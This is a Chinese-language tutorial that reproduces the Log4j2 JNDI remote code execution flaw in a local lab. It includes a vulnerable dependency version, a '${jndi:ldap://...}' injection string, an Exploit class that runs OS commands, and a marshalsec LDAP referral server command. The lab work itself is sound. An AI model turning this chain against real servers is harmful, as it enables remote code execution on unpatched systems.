# Log4j2漏洞测试

> [Java后端 别中招！手把手教你复现 Log4j2 漏洞](https://mp.weixin.qq.com/s/Vsej-hxa8O12UVNEA8x2MQ)

1. 简介

Apache Log4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。

2. 漏洞概述

该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。

3. 影响范围

Apache Log4j 2.x <= 2.15.0-rc1

4. 环境搭建

   1、创建一个新的maven项目，并导入Log4j的依赖包

   ```xml
   <dependency>
       <groupId>org.apache.logging.log4j</groupId>
       <artifactId>log4j-core</artifactId>
       <version>2.14.1</version>
   </dependency>
   ```

## 漏洞利用

1. 使用POC测试

   ```java
   import org.apache.logging.log4j.LogManager;
   import org.apache.logging.log4j.Logger;
   
   /**
    * @author cr
    * @date 2021/12/20 14:39
    */
   public class LogTest {
       public static final Logger logger = LogManager.getLogger();
   
       public static void main(String[] args) {
           logger.error("${jndi:ldap://localhost:8888/Exploit}");
       }
   }
   ```

2. 编译一恶意类[Exploit.class](https://github.com/a893206/log4j2-test/blob/main/src/test/java/Exploit.class)

   新建Exploit.java，然后编译为class文件

   ```java
   /**
    * @author cr
    * @date 2021/12/20 14:40
    */
   public class Exploit {
       static {
           System.err.println("Pwned");
           try {
               String osName = System.getProperty("os.name");
               String command = "";
               switch (osName) {
                   case "Mac OS X":
                       command = "open /System/Applications/Calculator.app";
                       break;
                   case "Windows":
                       command = "calc";
                       break;
                   default:
               }
               Runtime.getRuntime().exec(command);
           } catch ( Exception e ) {
               e.printStackTrace();
           }
       }
   }
   ```

   ```bash
   javac Exploit.java
   ```

3. 使用[marshalsec-0.0.3-SNAPSHOT-all.jar](https://github.com/a893206/log4j2-test/blob/main/src/test/java/marshalsec-0.0.3-SNAPSHOT-all.jar)本地开启一个LDAP服务

   [ldap.sh](https://github.com/a893206/log4j2-test/blob/main/src/test/java/ldap.sh)

   ```bash
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
   "http://127.0.0.1:7777/#Exploit" 8888
   ```

4. 运行[LogTest.java](https://github.com/a893206/log4j2-test/blob/main/src/test/java/LogTest.java)，即可访问恶意类并执行写在其中的命令

